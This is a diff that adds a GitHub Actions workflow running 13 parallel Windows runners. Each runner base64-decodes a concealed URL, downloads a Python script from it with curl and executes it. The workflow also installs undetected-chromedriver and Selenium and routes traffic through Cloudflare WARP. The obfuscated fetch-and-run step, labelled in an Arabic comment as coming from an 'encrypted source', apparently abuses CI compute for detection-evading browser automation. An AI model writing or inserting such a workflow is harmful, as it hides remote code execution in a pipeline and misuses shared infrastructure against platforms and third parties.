@@ -1,0 +1,70 @@
+name: Auto-Scaling Worker Array
+
+on:
+  repository_dispatch:
+    types: [run-task]
+  workflow_dispatch:
+
+concurrency:
+  group: scalable-fleet-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  launch-runners:
+    name: "Runner-${{ matrix.runner_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        runner_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13]
+
+    steps:
+      - name: Bootstrap Dependencies & Fetch Payload
+        shell: bash
+        run: |
+          echo "[START] Initializing runner ${{ matrix.runner_id }}..."
+          
+          # تنزيل الملف المشغل من المصدر المشفر
+          FETCH_PATH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2NhY2EvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$FETCH_PATH" -o app_task.py
+          
+          echo "[START] Installing essential modules..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[START] Environment is ready."
+
+      - name: Core Execution with Watchdog Timer
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Launching worker for Runner-${{ matrix.runner_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $SpawnParams = @{
+              FilePath     = "python"
+              ArgumentList = "app_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $ActiveWorker = Start-Process @SpawnParams
+          
+          Write-Output ">>> Supervisor started. Time cap: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $ActiveWorker -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Worker exited normally before timeout."
+          }
+          catch {
+              Write-Output ">>> Time budget consumed! Forcing termination..."
+              Stop-Process -InputObject $ActiveWorker -Force
+              Write-Output ">>> Worker killed forcibly."
+          }
+
+      - name: Cleanup and Logging
+        shell: bash
+        run: echo "[END] Runner-${{ matrix.runner_id }} has completed its run."
